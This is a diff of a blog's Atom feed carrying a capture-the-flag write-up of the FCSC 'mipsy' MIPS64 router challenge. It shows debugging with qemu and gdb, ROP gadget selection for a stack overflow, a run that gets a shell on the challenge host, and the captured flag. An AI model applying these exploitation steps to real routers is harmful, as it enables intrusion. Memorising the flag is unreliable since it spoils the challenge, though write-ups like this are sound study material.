@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/mipsy/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/mipsy/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-08-01T03:41:33+02:00</updated>
+    <updated>2022-08-02T13:40:56+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -73,27 +73,27 @@ EXPOSE 4000
 EXPOSE 1234
 CMD socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 ./mipsy&quot;
 </code></pre><p>So because it&rsquo;s not very convenient to debug it from the docker I tried to run it directly on my host with a gdb stub on port 5445. I setup my host by installing the right packages, deleting <code>/etc/ld.so.cache</code> and by the socat command on port 4000:</p>
-<pre><code>$ uname -a
-Linux off 5.8.0-50-generic #56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ uname -a
+Linux off 5.8.0-50-generic <span class="c1">#56~20.04.1-Ubuntu SMP Mon Apr 12 21:46:35 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
 $ sudo apt install socat qemu-user libc6-mips64-cross
 Lecture des listes de paquets... Fait
-Construction de l'arbre des dépendances       
-Lecture des informations d'état... Fait
-socat est déjà la version la plus récente (1.7.3.3-2).
-libc6-mips64-cross est déjà la version la plus récente (2.30-0ubuntu2cross2).
-qemu-user est déjà la version la plus récente (1:4.2-3ubuntu6.15).
-0 mis à jour, 0 nouvellement installés, 0 à enlever et 17 non mis à jour.
+Construction de l<span class="s1">&#39;arbre des dépendances       
+</span><span class="s1">Lecture des informations d&#39;</span>état... Fait
+socat est déjà la version la plus récente <span class="o">(</span>1.7.3.3-2<span class="o">)</span>.
+libc6-mips64-cross est déjà la version la plus récente <span class="o">(</span>2.30-0ubuntu2cross2<span class="o">)</span>.
+qemu-user est déjà la version la plus récente <span class="o">(</span>1:4.2-3ubuntu6.15<span class="o">)</span>.
+<span class="m">0</span> mis à jour, <span class="m">0</span> nouvellement installés, <span class="m">0</span> à enlever et <span class="m">17</span> non mis à jour.
 $ sudo rm -f /etc/ld.so.cache
-$ socat tcp-listen:4000,reuseaddr,fork exec:&quot;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&quot;
-</code></pre><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
-<pre><code>$ gdb-multiarch -ex 'source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py' -q ./mipsy
+$ socat tcp-listen:4000,reuseaddr,fork exec:<span class="s2">&#34;qemu-mips64 -L /usr/mips64-linux-gnuabi64 -g 5445 ./mipsy&#34;</span>
+</code></pre></div><p>We can debug the running process with gdb-multiarch (with the path of my pwndbg&rsquo;s gdbinit to get an cleaner output).</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ gdb-multiarch -ex <span class="s1">&#39;source /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/Downloads/pwndbg/gdbinit.py&#39;</span> -q ./mipsy
 Reading symbols from ./mipsy...
-(No debugging symbols found in ./mipsy)
-pwndbg: loaded 196 commands. Type pwndbg [filter] for a list.
-pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
+<span class="o">(</span>No debugging symbols found in ./mipsy<span class="o">)</span>
+pwndbg: loaded <span class="m">196</span> commands. Type pwndbg <span class="o">[</span>filter<span class="o">]</span> <span class="k">for</span> a list.
+pwndbg: created <span class="nv">$rebase</span>, <span class="nv">$ida</span> gdb functions <span class="o">(</span>can be used with print/break<span class="o">)</span>
 pwndbg&gt; target remote localhost:5445
 
-</code></pre><p>To send the payload  I used <a
+</code></pre></div><p>To send the payload  I used <a
   class="gblog-markdown__link"
   href="https://github.com/Gallopsled/pwntools"
   
@@ -111,35 +111,35 @@ pwndbg&gt; target remote localhost:5445
 <pre><code>$ python3 wu.py                                                               
 [+] Opening connection to localhost on port 4000: Done
 </code></pre><p>It does not return anything because it breaks in the shared libraries I guess, so now we can continue the execution in gdb:</p>
-<pre><code>Remote debugging using localhost:5445
-warning: Unable to find dynamic linker breakpoint function.
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">Remote debugging using localhost:5445
+warning: Unable to find dynamic linker breakpoint <span class="k">function</span>.
 GDB will be unable to debug shared library initializers
 and track explicitly loaded dynamic code.
-0x00000040008038d0 in ?? ()
-Could not check ASLR: Couldn't get personality
-Downloading '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy' from the remote server: OK
-add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
-'context': Print out the current register, instruction, and stack context.
-Exception occurred: context: unsupported operand type(s) for +: 'NoneType' and 'int' (&lt;class 'TypeError'&gt;)
-For more info invoke `set exception-verbose on` and rerun the command
-or debug it by yourself with `set exception-debugger on`
+0x00000040008038d0 in ?? <span class="o">()</span>
+Could not check ASLR: Couldn<span class="s1">&#39;t get personality
+</span><span class="s1">Downloading &#39;</span>/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy<span class="s1">&#39; from the remote server: OK
+</span><span class="s1">add-symbol-file /tmp/tmpsjb8mqsa/mipsy 0x120000000 -s .MIPS.abiflags 0x2400002e0 -s .MIPS.options 0x2400002f8 -s .note.gnu.build-id 0x240000870 -s .dynamic 0x240000898 -s .hash 0x240000aa8 -s .dynsym 0x240001190 -s .dynstr 0x240002858 -s .gnu.version 0x240003b12 -s .gnu.version_r 0x240003cf8 -s .rel.dyn 0x240003d38 -s .init 0x240003d58 -s .text 0x240003de0 -s .MIPS.stubs 0x2400257a0 -s .fini 0x2400259c0 -s .rodata 0x240025a10 -s .interp 0x24002d280 -s .eh_frame_hdr 0x24002d290 -s .eh_frame 0x24002d2a8 -s .note.ABI-tag 0x24002d2e0 -s .ctors 0x24003df58 -s .dtors 0x24003df68 -s .data.rel.ro 0x24003df78 -s .data 0x240040000 -s .rld_map 0x240040020 -s .got 0x240040030 -s .sdata 0x240040840 -s .bss 0x240040850
+</span><span class="s1">&#39;</span>context<span class="s1">&#39;: Print out the current register, instruction, and stack context.
+</span><span class="s1">Exception occurred: context: unsupported operand type(s) for +: &#39;</span>NoneType<span class="s1">&#39; and &#39;</span>int<span class="s1">&#39; (&lt;class &#39;</span>TypeError<span class="err">&#39;</span>&gt;<span class="o">)</span>
+For more info invoke <span class="sb">`</span><span class="nb">set</span> exception-verbose on<span class="sb">`</span> and rerun the <span class="nb">command</span>
+or debug it by yourself with <span class="sb">`</span><span class="nb">set</span> exception-debugger on<span class="sb">`</span>
 pwndbg&gt; vmmap
-LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
-       0x120000000        0x12002e000 r-xp    2e000 0      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+       0x120000000        0x12002e000 r-xp    2e000 <span class="m">0</span>      /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
        0x12002e000        0x12003d000 ---p     f000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-       0x12003d000        0x120040000 r--p     3000 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-       0x120040000        0x120043000 rw-p     3000 30000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
-      0x4000403000       0x4000828000 r--p   425000 0      &lt;explored&gt;
-      0x40007fe000       0x4000801000 rw-p     3000 0      [stack]
+       0x12003d000        0x120040000 r--p     <span class="m">3000</span> 2d000  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+       0x120040000        0x120043000 rw-p     <span class="m">3000</span> <span class="m">30000</span>  /media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ctf/fcsc/pwn/mipsy/mipsy
+      0x4000403000       0x4000828000 r--p   <span class="m">425000</span> <span class="m">0</span>      &lt;explored&gt;
+      0x40007fe000       0x4000801000 rw-p     <span class="m">3000</span> <span class="m">0</span>      <span class="o">[</span>stack<span class="o">]</span>
 
-[QEMU target detected - vmmap result might not be accurate; see `help vmmap`]
-pwndbg&gt; continue
+<span class="o">[</span>QEMU target detected - vmmap result might not be accurate<span class="p">;</span> see <span class="sb">`</span><span class="nb">help</span> vmmap<span class="sb">`</span><span class="o">]</span>
+pwndbg&gt; <span class="k">continue</span>
 Continuing.
-warning: Could not load shared library symbols for 2 libraries, e.g. /lib/libc.so.6.
-Use the &quot;info sharedlibrary&quot; command to see the complete listing.
-Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?
-[Inferior 1 (process 1) exited normally]
-</code></pre><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
+warning: Could not load shared library symbols <span class="k">for</span> <span class="m">2</span> libraries, e.g. /lib/libc.so.6.
+Use the <span class="s2">&#34;info sharedlibrary&#34;</span> <span class="nb">command</span> to see the <span class="nb">complete</span> listing.
+Do you need <span class="s2">&#34;set solib-search-path&#34;</span> or <span class="s2">&#34;set sysroot&#34;</span>?
+<span class="o">[</span>Inferior <span class="m">1</span> <span class="o">(</span>process 1<span class="o">)</span> exited normally<span class="o">]</span>
+</code></pre></div><p>The process exited because we didn&rsquo;t inserted any breakpoints and so our python script outs this:</p>
 <pre><code>+---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
@@ -163,9 +163,9 @@ Menu:
     </h2>
 </div>
 <p>We can take a look at the binary by running the file command:</p>
-<pre><code>$ file mipsy                                                                  
-mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version 1 (SYSV), dynamically linked, interpreter /lib64/ld.so.1, BuildID[sha1]=e20cf7872e96482095ce68e6d4d03806d5928de4, for GNU/Linux 3.2.0, not stripped
-</code></pre><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ file mipsy                                                                  
+mipsy: ELF 64-bit MSB executable, MIPS, MIPS64 rel2 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld.so.1, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e20cf7872e96482095ce68e6d4d03806d5928de4, <span class="k">for</span> GNU/Linux 3.2.0, not stripped
+</code></pre></div><p>So it&rsquo;s a mips64 big endian binary dynamically linked. As we see above, the program is asking for an input among 4 options: Quit, Show network interfaces, Ping internal HTTP file server and Login as admin. We can test these options remotely:</p>
 <pre><code>+---------------------------------+
 |/                               \|
 |        ITSY MIPSY ROUTER        |
@@ -466,23 +466,23 @@ The code looks like such:</p>
 <li>set <code>$gp</code>, the global pointer to the right value to be able do execute the <code>dla</code> instruction.</li>
 </ul>
 <p>An important thing to notice is that on mips architechture, when an instruction is executed the next instruction is too executed despite of the result of the current instruction. So when we will choose our gadgets, we need to be careful according to the instruction after the control flow instruction.</p>
-<p>And the good value for <code>$gp</code> is a constant from which the <a
+<p>And the good value for <code>$gp</code> is a constant for which the <a
   class="gblog-markdown__link"
   href="https://sourceware.org/binutils/docs-2.24/as/MIPS-Small-Data.html"
   
   ><code>dla</code></a
-> instruction addresses memory areas. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
+> instruction addresses a valid memory area. And if we check the value of <code>$gp</code> in gdb, we got: <code>0x120048020</code>.</p>
 <p>To control the <code>$v1</code> register we can grep on the gadgets found by ROPgadget:</p>
 <pre><code>$ grep &quot;ld \$v0, &quot; gadgets | grep \$sp
 </code></pre><p>Then we got a lot of candidate which are not efficient. And if we&rsquo;re very careful we find an interesting gadget:</p>
 <pre><code>0x000000012001b4d8 : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6
 </code></pre><p>It&rsquo;s perfect because it allows us to control the value of <code>$v0</code> and the value of the next gadget that we can store in <code>$t9</code> to jump on !</p>
 <p>We can apply process to find a gadget for $v1:</p>
-<pre><code>$ grep &quot;ld \$v1, &quot; gadgets | grep \$sp
-[skip]
-0x000000012001270c : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)
-[skip]
-</code></pre><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ grep <span class="s2">&#34;ld \$v1, &#34;</span> gadgets <span class="p">|</span> grep <span class="se">\$</span>sp
+<span class="o">[</span>skip<span class="o">]</span>
+0x000000012001270c : ld <span class="nv">$v1</span>, 0x80<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0xf0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> dsubu <span class="nv">$s5</span>, <span class="nv">$v0</span>, <span class="nv">$v1</span> <span class="p">;</span> dsll <span class="nv">$v0</span>, <span class="nv">$s5</span>, <span class="m">6</span> <span class="p">;</span> ld <span class="nv">$a0</span>, 0xb8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> ld <span class="nv">$t9</span>, 0xe0<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> move <span class="nv">$a1</span>, <span class="nv">$v0</span> <span class="p">;</span> sd <span class="nv">$v1</span>, 0xf8<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span> <span class="p">;</span> jalr <span class="nv">$t9</span> <span class="p">;</span> sd <span class="nv">$v0</span>, 0x100<span class="o">(</span><span class="nv">$sp</span><span class="o">)</span>
+<span class="o">[</span>skip<span class="o">]</span>
+</code></pre></div><p>It&rsquo;s a gadget a bit more hard to understand but we just have to take care to: do not write <code>$v0</code>, control the value of <code>$v9</code> to jump on, control the value of <code>$v1</code>. And so this gadget is a good candidate.</p>
 <p>Finally we need to control the value of the <code>$gp</code> register but to achieve that we do not need to use a gadget, because we already control it thanks to the vuln epilogue:</p>
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nl">.text:</span><span class="err">00000001200046</span><span class="nf">A4</span> <span class="no">loc_1200046A4</span><span class="p">:</span>                           <span class="c"># CODE XREF: authenticate+104↑j
 </span><span class="c"></span><span class="no">.text</span><span class="p">:</span><span class="mi">00000001200046</span><span class="no">A4</span>                 <span class="no">move</span>    <span class="no">$sp</span><span class="p">,</span> <span class="no">$fp</span>         <span class="c"># _
@@ -590,46 +590,46 @@ So we have to add to our payload:</p>
 </div>
 <p>According to the statements we need to read some files stored on the filer machine.
 So firstly let&rsquo;s run the exploit to get the shell:</p>
-<pre><code>$ ./solve.py                                                                  
-[!] Could not emulate PLT instructions for ELF('mipsy/mipsy')
-[!] Could not populate PLT: not enough values to unpack (expected 2, got 0)
-[*] 'mipsy/mipsy'
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ ./solve.py                                                                  
+<span class="o">[</span>!<span class="o">]</span> Could not emulate PLT instructions <span class="k">for</span> ELF<span class="o">(</span><span class="s1">&#39;mipsy/mipsy&#39;</span><span class="o">)</span>
+<span class="o">[</span>!<span class="o">]</span> Could not populate PLT: not enough values to unpack <span class="o">(</span>expected 2, got 0<span class="o">)</span>
+<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;mipsy/mipsy&#39;</span>
     Arch:     mips64-64-big
     RELRO:    Full RELRO
     Stack:    No canary found
     NX:       NX disabled
-    PIE:      No PIE (0x120000000)
+    PIE:      No PIE <span class="o">(</span>0x120000000<span class="o">)</span>
     RWX:      Has RWX segments
-[+] Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
-[*] Switching to interactive mode
+<span class="o">[</span>+<span class="o">]</span> Opening connection to challenges2.france-cybersecurity-challenge.fr on port 4005: Done
+<span class="o">[</span>*<span class="o">]</span> Switching to interactive mode
 Error: wrong password.
 $ id
-uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>ctf<span class="o">)</span>
 $ ls
 list_interfaces.sh
 mipsy
 $
-</code></pre><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
-<pre><code>$ curl filer
-&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot; &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
+</code></pre></div><p>We see no flag, so according to the statements maybe we have to curl the filer machine which seems to be a HTTP server:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl filer
+&lt;!DOCTYPE HTML PUBLIC <span class="s2">&#34;-//W3C//DTD HTML 4.01//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
 &lt;html&gt;
 &lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
-&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;Content-Type&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;text/html; charset=utf-8&#34;</span>&gt;
+&lt;title&gt;Directory listing <span class="k">for</span> /&lt;/title&gt;
 &lt;/head&gt;
 &lt;body&gt;
-&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;h1&gt;Directory listing <span class="k">for</span> /&lt;/h1&gt;
 &lt;hr&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href=&quot;flag&quot;&gt;flag&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;flag&#34;</span>&gt;flag&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr&gt;
 &lt;/body&gt;
 &lt;/html&gt;
-</code></pre><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
-<pre><code>$ curl filer/flag
-FCSC{82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519}
-</code></pre><p>And we got the flag !
+</code></pre></div><p>It&rsquo;s a directory listing of the files stored in filer, and so we just have to <code>curl filer/flag</code> to get the flag:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ curl filer/flag
+FCSC<span class="o">{</span>82ed60ce9c8b1136b1da7df24c9996b6232671e66f62bad1bd0e3fc163761519<span class="o">}</span>
+</code></pre></div><p>And we got the flag !
 This challenge was very cool because it&rsquo;s a &ldquo;real world&rdquo; scenario and it makes me discovering mips assembly !</p>
 ]]></content>
             
